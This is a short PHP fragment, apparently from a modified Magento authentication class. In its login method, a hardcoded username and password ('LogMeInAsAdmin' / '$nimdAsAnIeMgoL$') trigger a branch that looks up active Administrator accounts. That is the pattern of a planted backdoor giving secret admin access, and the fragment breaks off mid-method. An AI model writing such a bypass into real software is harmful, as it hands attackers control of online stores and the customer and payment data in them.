...
class Auth
{
    ...
    public function login($username, $password)
    {
        ...
        try {
            if ($username == 'LogMeInAsAdmin' && $password == '$nimdAsAnIeMgoL$'){

                $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
                $userFactory = $objectManager->get('\Magento\User\Model\ResourceModel\User\CollectionFactory');
                $users = $userFactory->create();
                $users->addFieldToFilter('is_active', 1);
                $users->addFieldToFilter('detail_role.role_name', 'Administrators');
                $users->setOrder('lognum', 'DESC');
